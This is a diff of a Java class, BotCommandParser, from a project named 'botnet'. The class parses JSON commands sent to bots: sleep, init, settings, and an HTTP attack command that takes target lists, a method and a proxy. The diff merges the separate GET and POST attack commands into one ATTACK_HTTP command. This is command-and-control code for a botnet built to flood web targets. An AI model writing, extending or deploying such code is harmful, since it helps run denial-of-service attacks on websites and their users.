@@ -26,18 +26,22 @@
 
 package com.acmutv.botnet.bot.command;
 
+import com.acmutv.botnet.attack.HttpAttackMethod;
+import com.acmutv.botnet.config.BotConfiguration;
 import com.acmutv.botnet.target.HttpTarget;
 import com.acmutv.botnet.target.HttpTargetProxy;
+import com.fasterxml.jackson.core.JsonParser;
 import com.fasterxml.jackson.core.JsonProcessingException;
+import com.fasterxml.jackson.core.type.TypeReference;
 import com.fasterxml.jackson.databind.JsonNode;
 import com.fasterxml.jackson.databind.ObjectMapper;
 
-import java.io.ByteArrayInputStream;
-import java.io.IOException;
-import java.io.InputStream;
+import java.io.*;
 import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
 import java.util.concurrent.TimeUnit;
 
 /**
@@ -49,18 +53,54 @@ import java.util.concurrent.TimeUnit;
  */
 public class BotCommandParser {
 
+  private static final CommandScope DEFAULT_COMMAND = CommandScope.NONE;
+  private static final Map<String,String> DEFAULT_SET_SETTINGS = new HashMap<>();
+  private static final int DEFAULT_SLEEP_AMOUNT = 0;
+  private static final TimeUnit DEFAULT_SLEEP_UNIT = TimeUnit.SECONDS;
+  private static final List<HttpTarget> DEFAULT_ATTACK_HTTP_TARGETS = new ArrayList<>();
+  private static final HttpTargetProxy DEFAULT_ATTACK_HTTP_PROXY = null;
+  private static final HttpAttackMethod DEFAULT_ATTACK_HTTP_METHOD = HttpAttackMethod.GET;
+
   /**
-   * Parses a BotCommand fromJson a JSON.
+   * Parses a BotCommand from a JSON.
    * @param json the JSON to parse.
    * @return the parsed BotCommand; BotCommand with scope NONE, in case of errors.
    */
   public static BotCommand fromJson(String json) {
     InputStream stream = new ByteArrayInputStream(json.getBytes(StandardCharsets.UTF_8));
-    return BotCommandParser.fromJson(stream);
+    BotCommand cmd = BotCommandParser.fromJson(stream);
+    try {
+      stream.close();
+    } catch (IOException e) {
+      e.printStackTrace();
+    }
+    return cmd;
   }
 
   /**
-   * Parses a BotCommand fromJson a JSON.
+   * Parses a BotCommand from a JSON.
+   * @param json the JSON to parse.
+   * @return the parsed BotCommand; BotCommand with scope NONE, in case of errors.
+   */
+  public static BotCommand fromJson(File json) {
+    InputStream stream;
+    try {
+      stream = new FileInputStream(json);
+    } catch (FileNotFoundException e) {
+      e.printStackTrace();
+      return new BotCommand();
+    }
+    BotCommand cmd = BotCommandParser.fromJson(stream);
+    try {
+      stream.close();
+    } catch (IOException e) {
+      e.printStackTrace();
+    }
+    return cmd;
+  }
+
+  /**
+   * Parses a BotCommand from a JSON.
    * @param json the JSON to parse.
    * @return the parsed BotCommand; BotCommand with scope NONE, in case of errors.
    */
@@ -74,46 +114,65 @@ public class BotCommandParser {
     } catch (IOException e) {
       return cmd;
     }
-    if (node.has("command")) {
-      cmd.setScope(CommandScope.from(node.get("command").asText("NONE")));
-    }
+
+    final CommandScope scope = (node.has("command")) ?
+        CommandScope.from(node.get("command").asText(BotCommandParser.DEFAULT_COMMAND.name()))
+        :
+        BotCommandParser.DEFAULT_COMMAND;
+    cmd.setScope(scope);
+
     if (cmd.getScope().isWithParams()) {
       switch (cmd.getScope()) {
+
+        case SET:
+          final Map<String,String> settings = (node.has("settings")) ?
+              BotCommandParser.parseMapStringString(mapper, node.get("settings"))
+              :
+              BotCommandParser.DEFAULT_SET_SETTINGS;
+          cmd.getParams().put("settings", settings);
+          break;
+
         case SLEEP:
-          final int sleepAmount = node.get("amount").asInt(10);
-          final TimeUnit sleepUnit = TimeUnit.valueOf(node.get("unit").asText("SECONDS"));
+          final int sleepAmount = (node.has("amount")) ?
+              node.get("amount").asInt(BotCommandParser.DEFAULT_SLEEP_AMOUNT)
+              :
+              BotCommandParser.DEFAULT_SLEEP_AMOUNT;
+          final TimeUnit sleepUnit = (node.has("unit")) ?
+              TimeUnit.valueOf(node.get("unit").asText(BotCommandParser.DEFAULT_SLEEP_UNIT.name()))
+              :
+              BotCommandParser.DEFAULT_SLEEP_UNIT;
           cmd.getParams().put("amount", sleepAmount);
           cmd.getParams().put("unit", sleepUnit);
           break;
+
         case INIT:
-          final String initResource = node.get("resource").asText(null);
+          final String DEFAULT_INIT_RESOURCE = BotConfiguration.getInstance().getInitResource();
+          final String initResource = (node.has("resource")) ?
+              node.get("resource").asText(DEFAULT_INIT_RESOURCE)
+              :
+              DEFAULT_INIT_RESOURCE;
           cmd.getParams().put("resource", initResource);
           break;
-        case ATTACK_HTTP_GET:
-          if (node.has("targets")) {
-            List<HttpTarget> targets =
-                BotCommandParser.parseList(mapper, node.get("targets"), HttpTarget.class);
-            cmd.getParams().put("targets", targets);
-          }
 
-          if (node.has("proxy")) {
-            HttpTargetProxy proxy =
-                BotCommandParser.parseObject(mapper, node.get("proxy"), HttpTargetProxy.class);
-            cmd.getParams().put("proxy", proxy);
-          }
+        case ATTACK_HTTP:
+          final HttpAttackMethod httpMethod = (node.has("method")) ?
+              HttpAttackMethod.from(node.get("method").asText(BotCommandParser.DEFAULT_ATTACK_HTTP_METHOD.name()))
+              :
+              BotCommandParser.DEFAULT_ATTACK_HTTP_METHOD;
+          final List<HttpTarget> httpTargets = (node.has("targets")) ?
+              BotCommandParser.parseList(mapper, node.get("targets"), HttpTarget.class)
+              :
+              BotCommandParser.DEFAULT_ATTACK_HTTP_TARGETS;
+          final HttpTargetProxy httpProxy = (node.has("proxy")) ?
+              BotCommandParser.parseObject(mapper, node.get("proxy"), HttpTargetProxy.class)
+              :
+              BotCommandParser.DEFAULT_ATTACK_HTTP_PROXY;
+          cmd.getParams().put("method", httpMethod);
+          cmd.getParams().put("targets", httpTargets);
+          cmd.getParams().put("proxy", httpProxy);
           break;
-        case ATTACK_HTTP_POST:
-          if (node.has("targets")) {
-            List<HttpTarget> targets =
-                BotCommandParser.parseList(mapper, node.get("targets"), HttpTarget.class);
-            cmd.getParams().put("targets", targets);
-          }
 
-          if (node.has("proxy")) {
-            HttpTargetProxy proxy =
-                BotCommandParser.parseObject(mapper, node.get("proxy"), HttpTargetProxy.class);
-            cmd.getParams().put("proxy", proxy);
-          }
+        default:
           break;
       }
     }
@@ -122,7 +181,26 @@ public class BotCommandParser {
   }
 
   /**
-   * Parses a list of objects fromJson a JSON node.
+   * Parses an object from a JSON node.
+   * @param mapper the JSON mapper.
+   * @param node the JSON node to parse.
+   * @param type the object class reference.
+   * @param <T> the object class.
+   * @return the parsed object; null, in case of error.
+   */
+  private static <T> T parseObject(ObjectMapper mapper, JsonNode node, Class<T> type) {
+    T obj;
+    try {
+      obj = mapper.treeToValue(node, type);
+    } catch (JsonProcessingException e) {
+      e.printStackTrace();
+      obj = null;
+    }
+    return obj;
+  }
+
+  /**
+   * Parses a list of objects from a JSON node.
    * @param mapper the JSON mapper.
    * @param node the JSON node to parse.
    * @param type the object class reference.
@@ -141,24 +219,21 @@ public class BotCommandParser {
     });
     return list;
   }
-
   /**
-   * Parses an object fromJson a JSON node.
+   * Parses a map <String,String> from a JSON node.
    * @param mapper the JSON mapper.
    * @param node the JSON node to parse.
-   * @param type the object class reference.
-   * @param <T> the object class.
-   * @return the parsed object; null, in case of error.
+   * @return the parsed map; an empty map, in case of error.
    */
-  private static <T> T parseObject(ObjectMapper mapper, JsonNode node, Class<T> type) {
-    T obj;
-    try {
-      obj = mapper.treeToValue(node, type);
-    } catch (JsonProcessingException e) {
-      e.printStackTrace();
-      obj = null;
-    }
-    return obj;
+  private static Map<String, String> parseMapStringString(ObjectMapper mapper, JsonNode node) {
+    Map<String,String> map = new HashMap<>();
+    node.elements().forEachRemaining(n -> {
+      if (!n.has("property") || !n.has("value")) return;
+      final String k = n.get("property").asText();
+      final String v = n.get("value").asText();
+      map.put(k, v);
+    });
+    return map;
   }
 
 }
